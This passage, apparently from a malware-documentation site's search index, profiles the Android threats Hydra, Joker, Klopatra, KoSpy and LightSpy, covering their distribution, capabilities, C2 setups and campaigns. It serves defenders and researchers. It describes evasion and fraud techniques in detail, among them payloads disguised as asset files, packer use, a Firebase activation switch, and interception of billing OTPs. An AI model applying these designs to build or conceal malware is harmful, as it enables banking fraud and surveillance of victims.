distributing Hydra through fake document manager apps. Other campaigns impersonate Google Chrome or Google Play Store to trick users into side-loading the payload.</p> <p>Affiliate-driven distribution: As a MaaS operation, Hydra's distribution varies by affiliate. Each renter configures their own target list, overlay set, and distribution method. Bridewell identified affiliates purchasing webinjects from the \"InTheBox\" marketplace on dark web forums, then deploying them through rented Hydra infrastructure.</p>"},{"location":"malware/families/hydra/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/hydra/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Fetches target list and injection ZIP from C2; displays phishing WebView over targeted banking/crypto apps Accessibility keylogging Monitors all <code>AccessibilityEvent</code> types, capturing TextField changes and button clicks Screen streaming Uses Screencast APIs to stream device display to C2 in real-time Remote interaction Receives commands from C2 translated to Accessibility actions (clicks, text input, gestures) On-device fraud Combines screen streaming and remote interaction for full device takeover without leaving the victim's device/IP PIN theft Captures lock screen PIN during user unlock via Accessibility monitoring SMS interception Reads, intercepts, and hides incoming SMS for OTP theft Session cookie theft Extracts browser session cookies to hijack authenticated sessions SOCKS5 proxy Routes traffic through infected device, allowing operators to appear as the victim's IP Google Play Protect disable Uses Accessibility to navigate settings and turn off Play Protect Notification suppression Hides notifications from banking apps to prevent victim awareness during fraud"},{"location":"malware/families/hydra/#version-evolution","title":"Version Evolution","text":"Period Key Additions 2018 BianLian dropper: functional app facade, Accessibility-based silent install, delivery of third-party payloads 2019 Hydra payload: overlay injection, SMS interception, basic remote access 2020-2021 Screen streaming via Screencast APIs, TeamViewer-like remote control, SOCKS5 proxy 2022 Session cookie theft, expanded on-device fraud, TOR-based C2 resolution, DGA domains 2023+ Continued affiliate expansion, updated webinject marketplace integration"},{"location":"malware/families/hydra/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hydra/#c2-communication","title":"C2 Communication","text":"<p>Hydra uses a layered C2 resolution approach that has evolved over time:</p> <p>TOR-based resolution: Recent variants include a hardcoded <code>.onion</code> URL pointing to <code>/api/mirrors</code>. The malware downloads TOR native libraries, connects to the TOR network, and retrieves a Base64-encoded JSON containing the active C2 server list. Cyble's analysis confirmed this TOR communication pattern.</p> <p>GitHub fallback: Some variants use a GitHub repository containing a Base64-encoded JSON object with C2 server addresses as an alternative to TOR resolution.</p> <p>DGA domains: Bridewell identified multiple DGA-generated domains used for fast-flux C2 infrastructure, providing redundancy and complicating takedowns. Their research identified 28 active C2 servers across a single campaign.</p> <p>Infrastructure location: NCC Group's research found that a significant number of C2 servers are hosted in the Netherlands, departing from the typical Russian/Chinese hosting patterns common in mobile malware.</p>"},{"location":"malware/families/hydra/#overlay-injection-flow","title":"Overlay Injection Flow","text":"<ol> <li>Bot registers with C2, sending device metadata and installed app list</li> <li>C2 responds with a target application list and a URL pointing to a ZIP file containing HTML overlay templates (injections)</li> <li>Bot monitors Accessibility events for targeted apps entering the foreground</li> <li>When a target is detected, the corresponding injection HTML is loaded in a WebView overlay</li> <li>Credentials entered into the overlay are exfiltrated to the C2</li> </ol> <p>The injection templates are sourced from underground marketplaces like \"InTheBox,\" where webinjects for specific banking apps are sold individually or in bundles.</p>"},{"location":"malware/families/hydra/#screen-streaming-and-remote-control","title":"Screen Streaming and Remote Control","text":"<p>Hydra's on-device fraud capability works through a two-channel system:</p> <ul> <li>Outbound: Device screen is captured via Android Screencast APIs and streamed to the C2</li> <li>Inbound: The operator sends interaction commands (tap coordinates, text input, swipe gestures) that Hydra translates into Accessibility actions on the device</li> </ul> <p>This creates a TeamViewer-like remote control session. Because the fraud occurs on the victim's device using their IP address and device fingerprint, it bypasses antifraud systems that rely on device/IP binding.</p>"},{"location":"malware/families/hydra/#persistence","title":"Persistence","text":"<p>Hydra requests Accessibility Service and Device Admin privileges. It suppresses notifications from security apps, disables Google Play Protect, and monitors for attempts to revoke its permissions, re-requesting them if removed.</p>"},{"location":"malware/families/hydra/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Hydra's affiliate model means targeting varies significantly by operator. Observed concentrations include:</p> Region Focus Turkey Historically the primary target region; Turkish banking apps consistently present in target lists Germany Bleeping Computer reported campaigns targeting Commerzbank (Germany's second-largest bank) Spain Bridewell documented a 2023 campaign focused on Spanish banking apps Latin America Same Bridewell research identified Latin American banking targets Broader Europe Austria, Italy, France, Netherlands, Poland, and other EU banking apps Cryptocurrency Wallet and exchange apps consistently present across affiliate target lists"},{"location":"malware/families/hydra/#notable-campaigns","title":"Notable Campaigns","text":"<p>2018-2019, BianLian dropper-as-a-service: ThreatFabric tracked BianLian's evolution from a simple dropper delivering Anubis payloads to a full-featured dropper service with its own banking trojan. The operators maintained persistent Google Play presence through rapid app replacement.</p> <p>2021, German banking campaign: Bleeping Computer reported a Hydra campaign specifically targeting Commerzbank customers, distributing a fake app that mimicked the bank's official Android application.</p> <p>2022, most prolific banking trojan: ThreatFabric's H1 2022 landscape report identified Hydra as the most active Android banking trojan by volume, surpassing Flubot (prior to its law enforcement takedown in May 2022), SharkBot, and TeaBot.</p> <p>Late 2022, European expansion with TOR C2: Cyble analyzed new Hydra variants incorporating TOR communication, SOCKS proxy, and Play Protect disabling. The campaign focused on European banking users with updated webinjects.</p> <p>January 2023, Spain and Latin America campaign: Bridewell identified a campaign distributing Hydra samples impersonating Google Chrome and Google Play Store. The research uncovered 28 C2 servers and DGA domain usage, with webinjects sourced from the InTheBox marketplace.</p> <p>February 2023, NCC Group technical deep-dive: NCC Group published a detailed technical analysis (also published via Fox-IT) covering Hydra's credential theft mechanisms, C2 infrastructure patterns, and overlay injection workflow.</p>"},{"location":"malware/families/joker/","title":"Joker (Bread)","text":"<p>Joker is the most persistent billing fraud family on Android, tracked internally by Google as \"Bread.\" Active since 2017, it has maintained a continuous presence on the Google Play Store through thousands of variants that cycle through evasion techniques faster than automated defenses can adapt. The family monetizes through WAP billing fraud, premium SMS subscriptions, and silent enrollment in paid services, generating revenue by charging victims through their phone bills.</p>"},{"location":"malware/families/joker/#overview","title":"Overview","text":"Attribute Details First Seen 2017 Status Active Type Billing fraud, premium SMS, subscription fraud Attribution Unknown, likely multiple independent operators Aliases Bread (Google), Joker, FaceStealer (some variants)"},{"location":"malware/families/joker/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Joker was first identified in the wild in 2017 and documented by Aleksejs Kuprins at CSIS Security Group in 2019 after discovery in 24 apps with over 472,000 combined installs. Google's Android Security team began tracking the family as \"Bread\" in early 2017 and published a detailed analysis in January 2020 revealing they had already removed over 1,700 infected apps from the Play Store. The family name \"Joker\" comes from one of the early C2 server domains.</p> <p>There is no single operator behind Joker. The low barrier to entry and high profitability of billing fraud means multiple independent threat actors build and submit Joker variants simultaneously. Google reported receiving up to 23 new Joker submissions in a single day during peak activity.</p>"},{"location":"malware/families/joker/#distribution","title":"Distribution","text":"<p>Joker distributes exclusively through the Google Play Store. The entire operational model depends on getting past Play Protect and app review. Distribution tactics include:</p> Tactic Description Functional wrapper apps Malicious code injected into legitimate utility apps (QR scanners, wallpaper apps, PDF tools, messaging apps) Versioning Upload a clean app, build user base, push malicious update Minimal initial payload First submission contains only a dropper; malicious payload downloaded from C2 post-install Category rotation Shift between app categories to avoid pattern detection Developer account cycling Burn and replace developer accounts when banned <p>Typical app categories abused: camera utilities, wallpapers, emoji keyboards, messaging clients, health trackers, PDF readers, and translation tools.</p>"},{"location":"malware/families/joker/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/joker/#fraud-mechanisms","title":"Fraud Mechanisms","text":"Mechanism Description WAP billing Connects to premium service payment pages over the device's mobile data connection; charges appear on phone bill Premium SMS Sends SMS to premium-rate short codes Subscription fraud Opens invisible WebViews to subscription pages, auto-fills phone number, intercepts confirmation OTP via SMS <p>WAP billing is the primary revenue source. The malware forces the device onto mobile data (disabling Wi-Fi if needed), navigates to carrier billing pages, and completes the subscription flow programmatically. After Google restricted <code>SEND_SMS</code> permissions in 2019, the family shifted almost entirely from premium SMS to WAP/toll fraud. Kaspersky published a detailed comparison of subscription trojans covering Joker alongside MobOk, Vesub, and GriftHorse, documenting the WAP billing abuse and SMS interception techniques each family uses.</p>"},{"location":"malware/families/joker/#evasion-evolution","title":"Evasion Evolution","text":"<p>Joker's defining characteristic is the speed at which it iterates evasion techniques. Google's 2020 blog post describes this as an arms race. Zscaler ThreatLabz and Trend Micro have published analyses tracking this progression:</p> Era Technique Details 2017-2018 Direct SMS fraud Called SMS APIs directly; detected quickly after Google tightened <code>SEND_SMS</code> policy 2018-2019 String encryption AES, Blowfish, DES, and combinations to hide C2 addresses and payload URLs from static scanners 2019 Java reflection Used <code>Reflect</code> API on decrypted strings at runtime to hide API calls from static analysis 2019-2020 Native code Moved core logic to <code>.so</code> libraries; harder for bytecode-level scanners to inspect 2020 Versioning Submitted clean apps, pushed malicious payloads in updates 2020-2021 Commercial packers Used Qihoo360, AliProtect, SecShell to wrap payloads 2021 GitHub payload hosting Stored payloads on GitHub Pages to avoid domain blocklists 2021-2022 URL shortener chains Used TinyURL, bit.ly, Rebrand.ly, zws.im to mask payload URLs from known-bad domain lists 2022+ Multi-stage droppers Play Store app contains only loader; fetches encrypted intermediate payload; intermediate fetches final payload"},{"location":"malware/families/joker/#payload-obfuscation","title":"Payload Obfuscation","text":"<p>Encryption across Joker variants is not standardized. Zscaler documented the following approaches across different variants:</p> Method Usage AES + Base64 Most common string encryption; each class may use a different key XOR Basic payload encryption in early variants Nested XOR Multiple XOR rounds with different keys DES / Blowfish Less common but observed in specific campaigns Custom key derivation Per-class or per-method keys generated at runtime Asset file disguise Payloads hidden as <code>.json</code>, <code>.ttf</code>, <code>.png</code>, or <code>.db</code> files in the assets directory"},{"location":"malware/families/joker/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/joker/#infection-flow","title":"Infection Flow","text":"<pre><code>Play Store App (clean-looking utility)\n    \u2192 attachBaseContext() loads dropper component\n    \u2192 Dropper decrypts embedded or downloaded stage-2 payload\n    \u2192 Stage-2 contacts C2 for configuration (target country, carrier, subscription URLs)\n    \u2192 Checks MCC (Mobile Country Code) against target list\n    \u2192 If match: disables Wi-Fi, forces mobile data\n    \u2192 Opens WAP billing page in invisible WebView\n    \u2192 Injects JavaScript to auto-fill phone number and confirm subscription\n    \u2192 Intercepts SMS confirmation code via NotificationListenerService or BroadcastReceiver\n    \u2192 Submits OTP to complete enrollment\n    \u2192 Deletes confirmation SMS\n</code></pre>"},{"location":"malware/families/joker/#c2-communication","title":"C2 Communication","text":"<p>C2 addresses are hidden using the techniques described in the evasion table. Common patterns include:</p> <ul> <li>Encrypted strings in <code>strings.xml</code> or class constants, decrypted at runtime</li> <li>C2 URLs split across multiple string variables, concatenated at runtime (e.g., the string \"sticker\" inserted as a delimiter between URL fragments)</li> <li>Cloud storage services (Firebase, GitHub) used as intermediate payload hosts</li> <li>Some variants use no persistent C2: the entire configuration is baked into the downloaded payload</li> </ul>"},{"location":"malware/families/joker/#country-targeting","title":"Country Targeting","text":"<p>Joker variants typically embed a list of target Mobile Country Codes (MCC). If the device SIM does not match a targeted country, the malware does not activate. This selective targeting reduces exposure and helps avoid detection in regions where researchers are more active. Common target regions include Southeast Asia, the Middle East, and Western Europe.</p>"},{"location":"malware/families/joker/#target-regions","title":"Target Regions","text":"<p>Joker targets countries where WAP billing and premium SMS services are active and profitable. Primary targets have included:</p> Region Countries Europe UK, Germany, France, Spain, Italy, Netherlands Asia India, Thailand, Malaysia, Indonesia, China Middle East Saudi Arabia, UAE, Kuwait Americas Brazil, Argentina Oceania Australia <p>Coverage varies by variant. Operators select targets based on which carriers have exploitable billing flows.</p>"},{"location":"malware/families/joker/#notable-campaigns","title":"Notable Campaigns","text":"<p>2019, September: CSIS researcher Aleksejs Kuprins publishes initial analysis identifying Joker in 24 Google Play apps with 472,000+ downloads. Documents SMS theft, contact exfiltration, and premium service enrollment.</p> <p>2020, January: Google publishes \"PHA Family Highlights: Bread (and Friends)\", revealing 1,700+ apps removed since 2017 and describing the ongoing cat-and-mouse with Bread operators.</p> <p>2020, July: Check Point Research identifies a new variant using the old technique of hiding payloads inside the Android Manifest file, evading updated Play Protect signatures.</p> <p>2020, September: Google removes 17 Joker-infected apps with 120,000+ combined downloads after detection by Zscaler ThreatLabz.</p> <p>2020, November: Trend Micro documents Joker variants using GitHub and GitHub Pages to host payloads, a technique not previously observed in the family.</p> <p>2021, June: Zscaler finds additional Joker apps on Google Play using URL shortener chains and multi-layer encryption to hide payload delivery.</p> <p>2022, July: Pradeo identifies Joker variants with over 100,000 installs, confirming the family's continued Play Store presence five years after initial discovery.</p> <p>2022, August: Zscaler reports Joker alongside Facestealer and Coper in a batch of malicious Google Play apps, showing the family remains part of the active Play Store threat landscape.</p>"},{"location":"malware/families/klopatra/","title":"Klopatra","text":"<p>Klopatra is a sophisticated Android banking trojan discovered by Cleafy in August 2025, operated by a Turkish-origin threat actor managing the full attack chain from development to fraud execution. The malware combines hidden VNC for remote device control with dynamic overlay attacks. It is notably protected by Virbox, a commercial Chinese packer rarely seen in Android malware, and has shifted core functionality from Java to native libraries. At the time of discovery, operators had compromised over 3,000 devices across two botnets targeting Spain and Italy.</p>"},{"location":"malware/families/klopatra/#overview","title":"Overview","text":"Attribute Details First Seen August 2025 Status Active Type Banking trojan, device takeover Attribution Turkish-origin threat actor Distribution Fake \"Mobdro Pro IP TV + VPN\" app Protection Virbox commercial packer"},{"location":"malware/families/klopatra/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's analysis traces Klopatra's operations to a Turkish-origin threat actor who manages the full attack chain. The family appears to be an independently developed project without direct code lineage to known banking trojan families.</p> <p>The attribution to Turkish-speaking actors places Klopatra alongside Frogblight, another Turkish banking trojan discovered in 2025 with possible connections to the Coper/Exobot ecosystem. While no direct code relationship between Klopatra and Frogblight has been established, both represent active Turkish-origin threats emerging in the same timeframe with distinct technical approaches: Frogblight uses custom keyboard keylogging while Klopatra relies on hidden VNC and native code.</p>"},{"location":"malware/families/klopatra/#distribution","title":"Distribution","text":"Vector Details Fake application \"Mobdro Pro IP TV + VPN\" impersonating the defunct Mobdro streaming app Sideloading Distributed outside the official Google Play Store <p>Cleafy documented the use of a fake \"Mobdro Pro IP TV + VPN\" application as the delivery vehicle. Mobdro was a popular free streaming application that was shut down, making it an effective lure since users searching for the app would encounter the malicious version.</p>"},{"location":"malware/families/klopatra/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/klopatra/#core-features","title":"Core Features","text":"Capability Implementation Hidden VNC Remote device control invisible to the victim Dynamic overlay attacks Phishing overlays injected over target banking apps Native library execution Core functionality shifted from Java to native code Screen blackout Device screen manipulation during remote fraud operations Nighttime operation Operators prefer attacking while victims sleep with phones charging"},{"location":"malware/families/klopatra/#hidden-vnc","title":"Hidden VNC","text":"<p>Klopatra implements hidden VNC (Virtual Network Computing) for remote device control, allowing operators to interact with the infected device in real time. Unlike screen streaming approaches used by families like Octo (which streams screenshots at 1 frame per second), VNC provides a more responsive remote session. The VNC implementation is hidden from the victim, with no visible indicators of the remote session.</p>"},{"location":"malware/families/klopatra/#dynamic-overlay-attacks","title":"Dynamic Overlay Attacks","text":"<p>The overlay attack capability dynamically injects phishing pages over target banking applications. When the victim opens a banking app, Klopatra detects the foreground application and displays a convincing phishing overlay to capture credentials. The dynamic nature means overlay content is served from C2 infrastructure rather than bundled in the APK, allowing operators to update and add new targets without rebuilding the malware.</p>"},{"location":"malware/families/klopatra/#nighttime-attack-pattern","title":"Nighttime Attack Pattern","text":"<p>Cleafy noted a distinctive operational preference: Klopatra operators favor conducting fraud during nighttime hours when victims are sleeping and their phones are charging. This timing is strategic for several reasons:</p> <ul> <li>The victim is unlikely to notice screen activity or device manipulation</li> <li>The device is connected to power, ensuring it stays operational during extended fraud sessions</li> <li>Banking app session timeouts are the only constraint on the operation window</li> <li>Notifications generated during fraud are less likely to be seen immediately</li> </ul>"},{"location":"malware/families/klopatra/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/klopatra/#native-code-migration","title":"Native Code Migration","text":"<p>Klopatra has shifted core functionality from Java to native libraries, a significant anti-analysis measure. Cleafy's analysis documented this architectural choice:</p> <ul> <li>Critical logic executes in compiled native code (C/C++) rather than Dalvik bytecode</li> <li>Native libraries are harder to decompile and analyze compared to Java/Kotlin code</li> <li>This raises the barrier for security researchers performing static analysis</li> <li>Dynamic analysis tools that hook Java methods may miss native function calls</li> </ul>"},{"location":"malware/families/klopatra/#virbox-packer","title":"Virbox Packer","text":"<p>Klopatra is protected by Virbox, a commercial Chinese software protection tool. Virbox is widely used for legitimate software protection but is rarely encountered in Android malware:</p> <ul> <li>Virbox applies code virtualization and encryption to the APK</li> <li>The packer complicates static analysis by obfuscating the application's code</li> <li>Its rarity in the Android malware ecosystem means security tools may have less robust unpacking support compared to commonly abused packers</li> <li>The choice of a commercial packer rather than custom obfuscation suggests the operators prioritize reliable protection over operational security of the development toolchain</li> </ul>"},{"location":"malware/families/klopatra/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Specific C2 protocol details were documented by Cleafy's research. The infrastructure supports real-time VNC sessions and dynamic overlay delivery, requiring persistent connectivity between the infected device and the operator's panel.</p>"},{"location":"malware/families/klopatra/#two-botnet-architecture","title":"Two-Botnet Architecture","text":"<p>Cleafy identified two separate botnets operated by the same threat actor:</p> Botnet Target Region Compromised Devices Botnet 1 Spain Part of 3,000+ total Botnet 2 Italy Part of 3,000+ total <p>The separation into regional botnets allows operators to maintain distinct overlay kits, C2 configurations, and operational schedules tuned to each target country.</p>"},{"location":"malware/families/klopatra/#target-regions","title":"Target Regions","text":"Region Status Details Spain Primary target Dedicated botnet Italy Primary target Dedicated botnet <p>Cleafy's report documents Spain and Italy as the two target regions, each served by a separate botnet. With over 3,000 compromised devices across both botnets, Klopatra represents a focused but sizable operation.</p>"},{"location":"malware/families/klopatra/#notable-campaigns","title":"Notable Campaigns","text":"<p>August 2025: Cleafy publishes their discovery of Klopatra, documenting a Turkish-origin banking trojan with hidden VNC, dynamic overlays, and Virbox packer protection. Over 3,000 devices are already compromised across two botnets targeting Spain and Italy. The operators' preference for nighttime attacks is identified as a distinctive operational pattern.</p>"},{"location":"malware/families/klopatra/#related-families","title":"Related Families","text":"<p>Klopatra's combination of hidden VNC and overlay attacks places it in the same capability tier as Hook, which offers VNC-based remote access alongside its Cerberus-derived banking trojan features. Vultur similarly uses screen streaming (via AlphaVNC) for device takeover. The native code migration pattern is shared with the latest versions of Medusa, which also moved critical components to native libraries in its v2 rewrite.</p> <p>The Turkish attribution connects Klopatra to a broader trend of Turkish-origin Android malware, alongside Frogblight and the Turkish-speaking operator groups behind Medusa. Each takes a different technical approach, but all target European banking customers.</p> <p>The use of the Virbox commercial packer is a distinctive choice that sets Klopatra apart from most Android banking trojans, which typically use custom packers or open-source obfuscation tools.</p>"},{"location":"malware/families/kospy/","title":"KoSpy","text":"<p>KoSpy is an Android spyware platform discovered by Lookout Threat Intelligence in March 2025, attributed with medium confidence to the North Korean state-sponsored group ScarCruft (APT37). The spyware was distributed through Google Play and third-party app stores disguised as utility applications such as \"File Manager,\" \"Phone Manager,\" and \"Kakao Security,\" targeting Korean and English-speaking users. KoSpy uses a two-stage C2 architecture: Firebase Firestore provides initial configuration (an activation switch and C2 address), while the actual C2 server delivers dynamically loaded plugins for surveillance functions including SMS collection, call log harvesting, location tracking, file exfiltration, audio recording, screenshot capture, and keylogging. Lookout identified infrastructure overlaps with APT43 (Kimsuky), suggesting shared resources between North Korean cyber operations.</p>"},{"location":"malware/families/kospy/#overview","title":"Overview","text":"Attribute Details First Seen March 2022 (earliest samples) Status Active as of March 2025; removed from Google Play Type Spyware, surveillance tool Aliases None known Attribution ScarCruft (APT37 / Reaper / Ricochet Chollima), with infrastructure links to APT43 (Kimsuky) Distribution Google Play Store, third-party app stores, fake utility applications"},{"location":"malware/families/kospy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Lookout published their analysis in March 2025, identifying KoSpy as a previously undocumented Android surveillance tool with samples dating back to March 2022. The three-year operational window before public disclosure indicates sustained, low-profile deployment characteristic of state-sponsored intelligence collection rather than financially motivated campaigns.</p> <p>ScarCruft (also tracked as APT37 and Reaper) has been active since at least 2012 as a North Korean state-sponsored cyber espionage group. The group has historically focused on South Korean targets, including government officials, defectors, journalists, and human rights activists. KoSpy represents their known Android surveillance capability, extending collection beyond traditional desktop and browser-based operations.</p> <p>Lookout identified infrastructure overlaps between KoSpy's campaign and operations previously attributed to APT43 (Kimsuky), another North Korean state-sponsored group. This overlap suggests either shared infrastructure resources between DPRK cyber units or coordinated operations, consistent with broader intelligence assessments of North Korean cyber operations where multiple groups share tooling and infrastructure.</p>"},{"location":"malware/families/kospy/#distribution","title":"Distribution","text":"Vector Details Google Play Store Uploaded as utility apps; since removed by Google Third-party app stores Fake utility applications hosted on alternative marketplaces <p>KoSpy masquerades as five different utility applications:</p> <ol> <li>File Manager</li> <li>Phone Manager (Korean: \ud734\ub300\ud3f0 \uad00\ub9ac\uc790)</li> <li>Smart Manager (Korean: \uc2a4\ub9c8\ud2b8 \uad00\ub9ac\uc790)</li> <li>Kakao Security (Korean: \uce74\uce74\uc624 \ubcf4\uc548)</li> <li>Software Update Utility</li> </ol> <p>The choice of app names is calculated. File managers and system utilities are apps users expect to request broad permissions (storage, contacts, SMS), making the permission requests less suspicious. The \"Kakao Security\" lure specifically targets Korean users by impersonating a security tool for KakaoTalk, South Korea's dominant messaging platform. The Korean-language app names alongside English-language variants confirm dual targeting of Korean-speaking and English-speaking populations.</p> <p>Google has since removed all identified KoSpy applications from the Play Store and deactivated the associated Firebase projects used for C2 configuration delivery.</p>"},{"location":"malware/families/kospy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/kospy/#core-features","title":"Core Features","text":"Capability Implementation SMS collection Harvests all SMS messages from the device Call log harvesting Extracts call history with numbers, timestamps, and durations Location tracking Collects GPS coordinates and location data File exfiltration Accesses and uploads files from local storage Audio recording Records ambient audio via device microphone Screenshot capture Takes screenshots of the current display Keylogging Captures keystrokes across applications Camera capture Photographs using device cameras WiFi network data Collects information about connected WiFi networks and nearby devices Installed app inventory Enumerates all applications installed on the device"},{"location":"malware/families/kospy/#plugin-based-surveillance","title":"Plugin-Based Surveillance","text":"<p>KoSpy's surveillance capabilities are delivered through dynamically loaded plugins rather than being statically compiled into the application. After retrieving its C2 address from Firebase Firestore, KoSpy sends two types of requests to the C2 server: one downloads executable plugins, the other retrieves configuration parameters for each surveillance function. This modular design allows operators to selectively enable or disable specific collection capabilities per target, update surveillance modules without pushing new app versions, and add new collection capabilities to deployed implants without reinfection.</p>"},{"location":"malware/families/kospy/#data-exfiltration","title":"Data Exfiltration","text":"<p>Collected data is encrypted with a hardcoded AES key before transmission to C2 servers. While a hardcoded key simplifies decryption for anyone with access to the malware sample, it ensures data in transit is not trivially readable by network monitoring tools, providing a baseline of operational security for the exfiltration channel.</p>"},{"location":"malware/families/kospy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/kospy/#two-stage-c2-architecture","title":"Two-Stage C2 Architecture","text":"<p>KoSpy's most notable technical feature is its use of Google's Firebase Firestore as a first-stage configuration delivery mechanism. On initial execution, the spyware queries a Firebase Firestore database to retrieve a simple configuration containing two parameters:</p> <ol> <li>An activation switch (\"on\" or \"off\")</li> <li>The actual C2 server address</li> </ol> <p>This architecture provides significant operational advantages. Firebase Firestore is a legitimate Google service, so traffic to it blends with normal app behavior and is unlikely to be flagged by network monitoring. The activation switch allows operators to keep implants dormant until they are ready to begin collection on a specific target. The C2 address can be rotated at any time through the Firestore database without touching the implant, providing resilience against C2 takedowns. Lookout identified five distinct Firebase projects and five C2 servers across the analyzed sample set.</p>"},{"location":"malware/families/kospy/#anti-analysis-checks","title":"Anti-Analysis Checks","text":"<p>Before activating surveillance functions, KoSpy performs two validation checks:</p> <ol> <li>Emulator detection to avoid executing in analysis sandboxes</li> <li>Date comparison against a hardcoded activation date to prevent premature exposure of capabilities</li> </ol> <p>These checks ensure the spyware does not reveal its malicious behavior to security researchers running samples in emulated environments or analyzing recently compiled builds before their intended deployment date.</p>"},{"location":"malware/families/kospy/#http-post-exfiltration","title":"HTTP POST Exfiltration","text":"<p>After passing validation checks and retrieving the C2 address from Firebase, KoSpy communicates with its C2 server via HTTP POST requests. Plugin downloads and configuration updates flow through this channel, as does exfiltrated surveillance data after AES encryption.</p>"},{"location":"malware/families/kospy/#target-regions","title":"Target Regions","text":"Period Primary Targets March 2022 onward Korean-speaking users (South Korea), English-speaking users <p>The dual-language targeting (Korean app names alongside English variants) indicates collection against both South Korean targets and English-speaking populations of interest to DPRK intelligence. The \"Kakao Security\" lure specifically targets South Korean users who use KakaoTalk, while \"File Manager\" and \"Software Update Utility\" serve as language-neutral lures applicable to any English-speaking target.</p>"},{"location":"malware/families/kospy/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2022 to March 2025: Lookout documented a sustained KoSpy campaign spanning approximately three years. The spyware operated through Google Play and third-party app stores using five fake utility application identities. The campaign leveraged Firebase Firestore for resilient C2 configuration delivery and dynamically loaded plugins for modular surveillance. Lookout attributed the operation to ScarCruft (APT37) with medium confidence based on infrastructure analysis, and identified shared infrastructure with APT43 (Kimsuky) operations. Google removed all identified apps and deactivated the associated Firebase projects following disclosure.</p>"},{"location":"malware/families/kospy/#related-families","title":"Related Families","text":"Family Relationship Hermit Both are state-sponsored Android spyware platforms with modular plugin architectures for surveillance. Hermit is attributed to Italian vendor RCS Lab, while KoSpy serves North Korean intelligence. SpyNote Both provide comprehensive Android surveillance (SMS, calls, location, audio, camera, keylogging), though SpyNote is a commodity RAT builder while KoSpy is a targeted state-sponsored tool with Firebase-based C2 configuration. Pegasus Both represent state-sponsored mobile surveillance, though Pegasus (NSO Group) exploits zero-day vulnerabilities for zero-click deployment while KoSpy relies on social engineering through fake utility apps."},{"location":"malware/families/lightspy/","title":"LightSpy","text":"<p>LightSpy is a modular surveillance framework targeting iOS, Android, macOS, Windows, Linux, and routers, with a persistent focus on the Asia-Pacific region. First documented in early 2020 during watering hole attacks against Hong Kong users, the framework is attributed with high confidence to Chinese state-sponsored operations overlapping with APT41. On Android, LightSpy operates through a plugin-based architecture where a lightweight Core orchestrator downloads and manages 14+ surveillance plugins covering location tracking, messaging app data extraction, payment system monitoring, ambient audio recording, and file exfiltration. ThreatFabric linked the Android variant (previously tracked as DragonEgg) to the same infrastructure as the iOS implant, unifying what had been treated as separate campaigns. As of early 2025, Hunt.io documented over 100 commands across all platforms, with new capabilities targeting Facebook and Instagram data on Android.</p>"},{"location":"malware/families/lightspy/#overview","title":"Overview","text":"Attribute Details First Seen January 2020 (watering hole discovery) Status Active, continuously expanding Type State-sponsored surveillance framework Attribution Chinese state-sponsored, APT41 overlap (Lookout, BlackBerry); earlier research linked to Spring Dragon/Lotus Blossom Aliases DragonEgg (Android variant, per Lookout), LightSpy mAPT Platforms Android, iOS, macOS, Windows, Linux, routers"},{"location":"malware/families/lightspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky and Trend Micro jointly disclosed LightSpy in March 2020, documenting a watering hole attack that delivered a full iOS exploit chain to visitors of a fake news site mimicking Hong Kong's Apple Daily newspaper. The campaign began on January 10, 2020 and escalated on February 18 with iframe-based redirects serving both the exploit payload and the legitimate news site to avoid suspicion.</p> <p>In July 2023, Lookout published research on two Android surveillance tools they named WyrmSpy and DragonEgg, attributing both to APT41. ThreatFabric subsequently established that DragonEgg's Core module was the Android component of the LightSpy framework, sharing infrastructure and C2 patterns with the iOS implant documented in 2020. WyrmSpy (also called AndroidControl) shared the same infrastructure and may represent a successor variant.</p> <p>BlackBerry's November 2024 analysis documented the DeepData framework deployed alongside LightSpy in targeted espionage campaigns across Southern Asia, reinforcing the APT41 attribution and revealing expanded operational scope.</p>"},{"location":"malware/families/lightspy/#distribution","title":"Distribution","text":"Vector Details Watering hole attacks Fake news sites mimicking legitimate media (Apple Daily clone targeting Hong Kong, 2020) Safari/WebKit exploit chain CVE-2020-9802 (WebKit RCE), CVE-2020-3837 (privilege escalation) for iOS delivery Trojanized applications Android delivery via fake utility apps and messaging apps distributed outside official stores iframe redirect chains Invisible iframes redirecting to exploit servers while loading legitimate content <p>The iOS watering hole campaign used a multi-stage exploit chain: visitors to the lure site were redirected through an invisible iframe to an exploit server that triggered CVE-2020-9802 (a WebKit vulnerability fixed in iOS 13.5) for initial code execution, with CVE-2020-9870 and CVE-2020-9910 (fixed in iOS 13.6) used as mitigation bypasses, and CVE-2020-3837 for privilege escalation to install the implant.</p> <p>Android distribution relies on trojanized applications rather than browser exploits. Targets are directed to download apps that appear legitimate but contain the LightSpy Core loader, which then fetches plugins from C2.</p>"},{"location":"malware/families/lightspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/lightspy/#android-plugin-architecture","title":"Android Plugin Architecture","text":"<p>LightSpy's Android variant operates through a Core orchestrator that manages surveillance plugins. ThreatFabric obtained the Core and 14 plugins from 20 active C2 servers. The Core creates a SQLite database named <code>light2.db</code> to store configuration, commands, and plugin data. Plugins are downloaded via WebSocket, while HTTPS handles data exfiltration.</p> Plugin Function <code>locationmodule</code> GPS tracking with precision down to building floor number <code>locationBaidu</code> Location tracking via Baidu services (China-focused) <code>soundrecord</code> Ambient audio recording and WeChat VOIP call interception <code>cameramodule</code> Silent photo capture from device cameras <code>wechat</code> WeChat message history, contacts, and group data extraction <code>bill</code> WeChat Pay transaction and payment history collection <code>qq</code> QQ messenger data extraction <code>telegram</code> Telegram message and contact exfiltration <code>softchat</code> / <code>softlist</code> Installed application enumeration and messaging app data <code>chatfile</code> File extraction from messaging app storage directories <code>filemanager</code> General file system browsing and exfiltration <code>browser</code> Browser history, bookmarks, and saved data <code>shell</code> Remote shell command execution 